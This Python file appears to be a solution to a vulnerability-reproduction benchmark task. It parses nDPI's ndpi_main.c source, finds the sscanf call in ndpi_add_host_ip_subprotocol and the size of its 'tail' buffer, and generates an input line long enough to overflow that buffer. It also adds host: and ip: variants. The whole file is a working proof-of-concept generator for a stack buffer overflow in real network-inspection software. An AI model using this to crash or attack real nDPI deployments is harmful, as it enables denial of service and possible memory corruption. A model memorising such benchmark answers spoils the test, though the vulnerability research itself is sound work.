import os
import re
import tarfile
from typing import List, Optional, Tuple, Dict


def _c_unescape(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        ch = s[i]
        if ch != '\\':
            out.append(ch)
            i += 1
            continue
        i += 1
        if i >= n:
            break
        esc = s[i]
        i += 1
        if esc == 'a':
            out.append('\a')
        elif esc == 'b':
            out.append('\b')
        elif esc == 'f':
            out.append('\f')
        elif esc == 'n':
            out.append('\n')
        elif esc == 'r':
            out.append('\r')
        elif esc == 't':
            out.append('\t')
        elif esc == 'v':
            out.append('\v')
        elif esc in ("\\", "'", '"', '?'):
            out.append(esc)
        elif esc == 'x':
            j = i
            while j < n and s[j] in "0123456789abcdefABCDEF":
                j += 1
            if j > i:
                try:
                    out.append(chr(int(s[i:j], 16) & 0xFF))
                except Exception:
                    pass
                i = j
            else:
                out.append('x')
        elif '0' <= esc <= '7':
            j = i - 1
            k = j
            cnt = 0
            while k < n and cnt < 3 and '0' <= s[k] <= '7':
                k += 1
                cnt += 1
            try:
                out.append(chr(int(s[j:k], 8) & 0xFF))
            except Exception:
                out.append(esc)
            i = k
        else:
            out.append(esc)
    return "".join(out)


def _strip_c_comments(text: str) -> str:
    # Not used for parsing structure; kept as utility.
    out = []
    i = 0
    n = len(text)
    state = 0  # 0 normal, 1 string, 2 char, 3 line comment, 4 block comment
    while i < n:
        ch = text[i]
        if state == 0:
            if ch == '"' and not (i > 0 and text[i - 1] == '\\'):
                out.append(ch)
                state = 1
                i += 1
            elif ch == "'" and not (i > 0 and text[i - 1] == '\\'):
                out.append(ch)
                state = 2
                i += 1
            elif ch == '/' and i + 1 < n and text[i + 1] == '/':
                state = 3
                i += 2
            elif ch == '/' and i + 1 < n and text[i + 1] == '*':
                state = 4
                i += 2
            else:
                out.append(ch)
                i += 1
        elif state == 1:
            out.append(ch)
            if ch == '\\' and i + 1 < n:
                out.append(text[i + 1])
                i += 2
            elif ch == '"':
                state = 0
                i += 1
            else:
                i += 1
        elif state == 2:
            out.append(ch)
            if ch == '\\' and i + 1 < n:
                out.append(text[i + 1])
                i += 2
            elif ch == "'":
                state = 0
                i += 1
            else:
                i += 1
        elif state == 3:
            if ch == '\n':
                out.append('\n')
                state = 0
            i += 1
        else:
            if ch == '*' and i + 1 < n and text[i + 1] == '/':
                state = 0
                i += 2
            else:
                i += 1
    return "".join(out)


def _extract_balanced(text: str, start: int, open_ch: str, close_ch: str) -> Optional[Tuple[int, int]]:
    if start < 0 or start >= len(text) or text[start] != open_ch:
        return None
    i = start + 1
    n = len(text)
    depth = 1
    state = 0  # 0 normal, 1 string, 2 char, 3 line comment, 4 block comment
    while i < n:
        ch = text[i]
        if state == 0:
            if ch == '"' and not (i > 0 and text[i - 1] == '\\'):
                state = 1
                i += 1
                continue
            if ch == "'" and not (i > 0 and text[i - 1] == '\\'):
                state = 2
                i += 1
                continue
            if ch == '/' and i + 1 < n and text[i + 1] == '/':
                state = 3
                i += 2
                continue
            if ch == '/' and i + 1 < n and text[i + 1] == '*':
                state = 4
                i += 2
                continue
            if ch == open_ch:
                depth += 1
            elif ch == close_ch:
                depth -= 1
                if depth == 0:
                    return (start, i + 1)
            i += 1
        elif state == 1:
            if ch == '\\' and i + 1 < n:
                i += 2
            elif ch == '"':
                state = 0
                i += 1
            else:
                i += 1
        elif state == 2:
            if ch == '\\' and i + 1 < n:
                i += 2
            elif ch == "'":
                state = 0
                i += 1
            else:
                i += 1
        elif state == 3:
            if ch == '\n':
                state = 0
            i += 1
        else:
            if ch == '*' and i + 1 < n and text[i + 1] == '/':
                state = 0
                i += 2
            else:
                i += 1
    return None


def _split_c_args(arg_str: str) -> List[str]:
    args = []
    buf = []
    i = 0
    n = len(arg_str)
    state = 0  # 0 normal, 1 string, 2 char, 3 line comment, 4 block comment
    par = 0
    bra = 0
    brk = 0
    while i < n:
        ch = arg_str[i]
        if state == 0:
            if ch == '"' and not (i > 0 and arg_str[i - 1] == '\\'):
                buf.append(ch)
                state = 1
                i += 1
                continue
            if ch == "'" and not (i > 0 and arg_str[i - 1] == '\\'):
                buf.append(ch)
                state = 2
                i += 1
                continue
            if ch == '/' and i + 1 < n and arg_str[i + 1] == '/':
                state = 3
                i += 2
                continue
            if ch == '/' and i + 1 < n and arg_str[i + 1] == '*':
                state = 4
                i += 2
                continue
            if ch == '(':
                par += 1
                buf.append(ch)
                i += 1
                continue
            if ch == ')':
                if par > 0:
                    par -= 1
                buf.append(ch)
                i += 1
                continue
            if ch == '{':
                bra += 1
                buf.append(ch)
                i += 1
                continue
            if ch == '}':
                if bra > 0:
                    bra -= 1
                buf.append(ch)
                i += 1
                continue
            if ch == '[':
                brk += 1
                buf.append(ch)
                i += 1
                continue
            if ch == ']':
                if brk > 0:
                    brk -= 1
                buf.append(ch)
                i += 1
                continue
            if ch == ',' and par == 0 and bra == 0 and brk == 0:
                args.append("".join(buf).strip())
                buf = []
                i += 1
                continue
            buf.append(ch)
            i += 1
        elif state == 1:
            buf.append(ch)
            if ch == '\\' and i + 1 < n:
                buf.append(arg_str[i + 1])
                i += 2
            elif ch == '"':
                state = 0
                i += 1
            else:
                i += 1
        elif state == 2:
            buf.append(ch)
            if ch == '\\' and i + 1 < n:
                buf.append(arg_str[i + 1])
                i += 2
            elif ch == "'":
                state = 0
                i += 1
            else:
                i += 1
        elif state == 3:
            if ch == '\n':
                buf.append('\n')
                state = 0
            i += 1
        else:
            if ch == '*' and i + 1 < n and arg_str[i + 1] == '/':
                state = 0
                i += 2
            else:
                i += 1
    if buf:
        args.append("".join(buf).strip())
    return [a for a in args if a != ""]


def _extract_c_string_literals(expr: str) -> Optional[str]:
    # Concatenate adjacent C string literals in expression.
    i = 0
    n = len(expr)
    state = 0  # 0 normal, 1 string, 2 char, 3 line comment, 4 block comment
    literals = []
    while i < n:
        ch = expr[i]
        if state == 0:
            if ch == '/' and i + 1 < n and expr[i + 1] == '/':
                state = 3
                i += 2
                continue
            if ch == '/' and i + 1 < n and expr[i + 1] == '*':
                state = 4
                i += 2
                continue
            if ch == "'":
                state = 2
                i += 1
                continue
            if ch == '"':
                state = 1
                i += 1
                start = i
                buf = []
                while i < n:
                    c = expr[i]
                    if c == '\\' and i + 1 < n:
                        buf.append(c)
                        buf.append(expr[i + 1])
                        i += 2
                        continue
                    if c == '"':
                        break
                    buf.append(c)
                    i += 1
                if i < n and expr[i] == '"':
                    literals.append(_c_unescape("".join(buf)))
                    i += 1
                    state = 0
                    continue
                else:
                    return None
            else:
                i += 1
        elif state == 1:
            # handled inline
            i += 1
        elif state == 2:
            if ch == '\\' and i + 1 < n:
                i += 2
            elif ch == "'":
                state = 0
                i += 1
            else:
                i += 1
        elif state == 3:
            if ch == '\n':
                state = 0
            i += 1
        else:
            if ch == '*' and i + 1 < n and expr[i + 1] == '/':
                state = 0
                i += 2
            else:
                i += 1
    if not literals:
        return None
    return "".join(literals)


def _parse_defines_int(content: str) -> Dict[str, int]:
    defines: Dict[str, int] = {}
    for m in re.finditer(r'^[ \t]*#define[ \t]+([A-Za-z_]\w*)[ \t]+(.+?)\s*(?:/\*.*)?$', content, re.M):
        name = m.group(1)
        val = m.group(2).strip()
        if '(' in name or ')' in name:
            continue
        if re.search(r'\b[A-Za-z_]\w*\s*\(', val):
            continue
        val = val.split('//', 1)[0].strip()
        if not val:
            continue
        if re.fullmatch(r'[0-9]+', val):
            try:
                defines[name] = int(val, 10)
            except Exception:
                pass
            continue
        if re.fullmatch(r'0x[0-9a-fA-F]+', val):
            try:
                defines[name] = int(val, 16)
            except Exception:
                pass
            continue
        if re.fullmatch(r'[0-9xXa-fA-F \t\(\)\+\-\*\/\|&<>\^~]+', val):
            try:
                defines[name] = int(eval(val, {"__builtins__": {}}, {}))
            except Exception:
                pass
    return defines


def _eval_c_int_expr(expr: str, defines: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if re.fullmatch(r'\d+', expr):
        return int(expr)
    if re.fullmatch(r'0x[0-9a-fA-F]+', expr):
        return int(expr, 16)
    # Replace known identifiers
    def repl(m):
        name = m.group(0)
        if name in defines:
            return str(defines[name])
        return name

    expr2 = re.sub(r'\b[A-Za-z_]\w*\b', repl, expr)
    expr2 = expr2.replace('sizeof', '')
    if not re.fullmatch(r'[0-9 \t\(\)\+\-\*\/\|&<>\^~]+', expr2):
        return None
    try:
        return int(eval(expr2, {"__builtins__": {}}, {}))
    except Exception:
        return None


def _extract_function(content: str, func_name: str) -> Optional[str]:
    m = re.search(r'\b' + re.escape(func_name) + r'\s*\(', content)
    if not m:
        return None
    pos = m.start()
    brace = content.find('{', m.end())
    if brace == -1:
        return None
    bal = _extract_balanced(content, brace, '{', '}')
    if not bal:
        return None
    return content[pos:bal[1]]


def _find_tail_size(func_text: str, file_content: str) -> int:
    # Try numeric first
    m = re.search(r'\bchar\s+tail\s*\[\s*([^\]]+)\s*\]', func_text)
    if not m:
        return 64
    expr = m.group(1).strip()
    defines = _parse_defines_int(file_content)
    val = _eval_c_int_expr(expr, defines)
    if val is None or val <= 0 or val > 1_000_000:
        return 64
    return val


def _parse_next_conversion(fmt: str, i: int):
    # returns (next_i, is_percent_literal, conv_dict or None, literal_str or None)
    n = len(fmt)
    if i >= n:
        return i, False, None, None
    ch = fmt[i]
    if ch != '%':
        return i + 1, False, None, fmt[i]
    if i + 1 < n and fmt[i + 1] == '%':
        return i + 2, True, None, '%'
    j = i + 1
    suppressed = False
    if j < n and fmt[j] == '*':
        suppressed = True
        j += 1
    width = None
    if j < n and fmt[j].isdigit():
        k = j
        while k < n and fmt[k].isdigit():
            k += 1
        try:
            width = int(fmt[j:k])
        except Exception:
            width = None
        j = k
    # Skip length modifiers
    while j < n:
        if fmt[j] in "hljztL":
            if fmt[j] in "hl" and j + 1 < n and fmt[j + 1] == fmt[j]:
                j += 2
            else:
                j += 1
            continue
        break
    if j >= n:
        return n, False, None, None
    if fmt[j] == '[':
        j += 1
        scanset = ""
        if j < n and fmt[j] == '^':
            scanset += '^'
            j += 1
        if j < n and fmt[j] == ']':
            scanset += ']'
            j += 1
        while j < n and fmt[j] != ']':
            scanset += fmt[j]
            j += 1
        if j < n and fmt[j] == ']':
            j += 1
        conv = {'kind': 'set', 'scanset': scanset, 'width': width, 'suppressed': suppressed}
        return j, False, conv, None
    conv_char = fmt[j]
    j += 1
    conv = {'kind': conv_char, 'scanset': None, 'width': width, 'suppressed': suppressed}
    return j, False, conv, None


def _format_conversions(fmt: str) -> List[dict]:
    i = 0
    convs = []
    while i < len(fmt):
        ni, is_lit_percent, conv, lit = _parse_next_conversion(fmt, i)
        if conv is not None:
            convs.append(conv)
        i = ni
    return convs


def _token_for_conversion(conv: dict, is_tail: bool, tail_size: int) -> str:
    kind = conv['kind']
    width = conv.get('width')
    scanset = conv.get('scanset')

    def choose_allowed_char_for_scanset(sc: str) -> str:
        if sc is None:
            return 'A'
        if sc.startswith('^'):
            excluded = sc[1:]
            for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
                if c not in excluded:
                    return c
            return 'A' if 'A' not in excluded else 'B'
        else:
            # allowed set listed; pick first reasonable literal character
            for c in sc:
                if c not in '-':
                    return c
            return 'A'

    if kind == 'n':
        return ""
    if kind in ('d', 'i', 'u', 'x', 'X', 'o', 'p'):
        return "0"
    if kind in ('f', 'F', 'e', 'E', 'g', 'G', 'a', 'A'):
        return "0"
    if kind == 'c':
        cnt = 1
        if width is not None and width > 0:
            cnt = min(width, 1 if not is_tail else max(2, min(width, tail_size + 1)))
        elif is_tail:
            cnt = max(2, tail_size + 1)
        return "A" * cnt
    if kind == 's':
        if is_tail:
            return "A" * max(2, tail_size + 1)
        if width is not None and width > 0:
            return "A" * min(1, width)
        return "A"
    if kind == 'set':
        ch = choose_allowed_char_for_scanset(scanset or "")
        if is_tail:
            return ch * max(2, tail_size + 1)
        if width is not None and width > 0:
            return ch * min(1, width)
        return ch
    # unknown: provide a token that is short
    return "A" if not is_tail else ("A" * max(2, tail_size + 1))


def _generate_input_from_format(fmt: str, tail_arg_pos: int, tail_size: int) -> str:
    out: List[str] = []
    i = 0
    assign_i = 0
    while i < len(fmt):
        ch = fmt[i]
        if ch != '%':
            if ch.isspace():
                if not out:
                    out.append(' ')
                else:
                    last = out[-1]
                    if not last or not last[-1].isspace():
                        out.append(' ')
            else:
                out.append(ch)
            i += 1
            continue
        # percent
        if i + 1 < len(fmt) and fmt[i + 1] == '%':
            out.append('%')
            i += 2
            continue
        ni, _, conv, lit = _parse_next_conversion(fmt, i)
        if conv is None:
            break
        is_tail = (not conv.get('suppressed', False) and assign_i == tail_arg_pos)
        tok = _token_for_conversion(conv, is_tail, tail_size)
        out.append(tok)
        if not conv.get('suppressed', False):
            assign_i += 1
        i = ni
    s = "".join(out)
    s = s.replace('\x00', 'A')
    s = s.strip('\r\n')
    return s


def _extract_calls_with_name(func_text: str, name: str) -> List[str]:
    calls = []
    idx = 0
    while True:
        j = func_text.find(name, idx)
        if j == -1:
            break
        # ensure word boundary
        if j > 0 and (func_text[j - 1].isalnum() or func_text[j - 1] == '_'):
            idx = j + len(name)
            continue
        k = j + len(name)
        while k < len(func_text) and func_text[k].isspace():
            k += 1
        if k >= len(func_text) or func_text[k] != '(':
            idx = j + len(name)
            continue
        bal = _extract_balanced(func_text, k, '(', ')')
        if not bal:
            idx = k + 1
            continue
        calls.append(func_text[j:bal[1]])
        idx = bal[1]
    return calls


def _best_sscanf_format_and_tail_index(func_text: str, tail_size: int) -> Optional[Tuple[str, int]]:
    candidates = []
    for nm in ("__isoc99_sscanf", "sscanf"):
        for call in _extract_calls_with_name(func_text, nm):
            paren = call.find('(')
            if paren == -1:
                continue
            inner = call[paren + 1:-1]
            args = _split_c_args(inner)
            if len(args) < 2:
                continue
            fmt_expr = args[1]
            fmt = _extract_c_string_literals(fmt_expr)
            if not fmt:
                continue
            out_args = args[2:]
            if not out_args:
                continue
            tail_positions = []
            for idx, a in enumerate(out_args):
                if re.search(r'\btail\b', a):
                    tail_positions.append(idx)
            if not tail_positions:
                continue
            tail_pos = tail_positions[0]
            convs = _format_conversions(fmt)
            # map tail_pos to conversion index among non-suppressed
            assign_i = 0
            tail_conv = None
            for conv in convs:
                if conv.get('suppressed', False):
                    continue
                if assign_i == tail_pos:
                    tail_conv = conv
                    break
                assign_i += 1
            if tail_conv is None:
                continue
            kind = tail_conv['kind']
            width = tail_conv.get('width')
            good = (kind in ('s', 'set') and width is None)
            candidates.append((1 if good else 0, fmt, tail_pos))
    if not candidates:
        return None
    candidates.sort(key=lambda x: (x[0], -len(x[1])), reverse=True)
    _, fmt, tail_pos = candidates[0]
    return fmt, tail_pos


def _load_ndpi_main_source(src_path: str) -> Optional[str]:
    if os.path.isdir(src_path):
        best = None
        best_score = -1
        for root, _, files in os.walk(src_path):
            for fn in files:
                if fn == "ndpi_main.c":
                    path = os.path.join(root, fn)
                    score = 0
                    low = path.replace("\\", "/").lower()
                    if "/src/lib/" in low:
                        score += 10
                    if "/lib/" in low:
                        score += 3
                    if score > best_score:
                        best_score = score
                        best = path
        if best is None:
            return None
        try:
            with open(best, "rb") as f:
                return f.read().decode("utf-8", errors="ignore")
        except Exception:
            return None

    try:
        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            candidates = []
            for m in members:
                name = m.name.replace("\\", "/")
                if name.endswith("ndpi_main.c"):
                    score = 0
                    low = name.lower()
                    if low.endswith("src/lib/ndpi_main.c"):
                        score += 100
                    if "/src/lib/" in low:
                        score += 10
                    if "/lib/" in low:
                        score += 3
                    score -= len(name) / 10000.0
                    candidates.append((score, m))
            if not candidates:
                return None
            candidates.sort(key=lambda x: x[0], reverse=True)
            m = candidates[0][1]
            f = tf.extractfile(m)
            if not f:
                return None
            data = f.read()
            return data.decode("utf-8", errors="ignore")
    except Exception:
        return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        content = _load_ndpi_main_source(src_path)
        if not content:
            return (b"A" * 1024) + b"\n"

        func = _extract_function(content, "ndpi_add_host_ip_subprotocol")
        if not func:
            return (b"A" * 1024) + b"\n"

        tail_size = _find_tail_size(func, content)
        best = _best_sscanf_format_and_tail_index(func, tail_size)

        if best:
            fmt, tail_idx = best
            base_line = _generate_input_from_format(fmt, tail_idx, tail_size)
        else:
            base_line = "A" * max(2, tail_size + 1)

        base_line = base_line.replace("\r", "").replace("\n", "")
        if not base_line:
            base_line = "A" * max(2, tail_size + 1)

        lines = [base_line]

        if not re.match(r'^\s*(host|ip)\s*[:;]', base_line):
            lines.append("host:" + base_line)
            lines.append("ip:" + base_line)

        # Deduplicate while preserving order
        seen = set()
        uniq = []
        for ln in lines:
            if ln not in seen:
                seen.add(ln)
                uniq.append(ln)

        payload = "\n".join(uniq) + "\n"
        return payload.encode("ascii", errors="ignore")